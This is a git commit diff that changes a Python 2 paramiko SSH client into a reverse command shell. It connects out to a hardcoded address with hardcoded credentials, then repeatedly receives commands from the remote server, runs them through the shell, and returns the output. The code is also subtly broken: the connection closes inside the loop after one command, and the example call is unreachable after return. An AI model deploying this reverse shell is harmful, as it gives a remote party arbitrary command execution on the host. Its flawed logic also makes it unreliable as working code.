684705e13502871b0811837bba369c37c8100be0
Gokul R Krishnan <63335983+gokulkrishnxn@users.noreply.github.com>
2022-01-17 18:15:46 +0530

    Updated ssh_client

--- ssh.py
+++ ssh.py
@@ -12,9 +12,16 @@ def ssh_command(ip, user, passwd, command):
 	client.connect(ip, username=user, password=passwd)
 	ssh_session = client.get_transport().open_session()
 	if ssh_session.active:
-		ssh_session.exec_command(command)
-		print ssh_session.recv(1024)
-
+		ssh_session.send(command)
+		print ssh_session.recv(1024) # read banner
+		while True:
+			command = ssh_session.recv(1024) # get the command from the ssh server
+			try:
+				cmd_output = subprocess.check_output(command, shell=True)
+				ssh_session.send(cmd_output)
+			except Exception, e:
+				ssh_session.send(str(e))
+			client.close()
 	return
 
 	ssh_command('192.168.100.131', 'justin', 'lovesthepython', 'id') # chnage the ip and user and the password with id
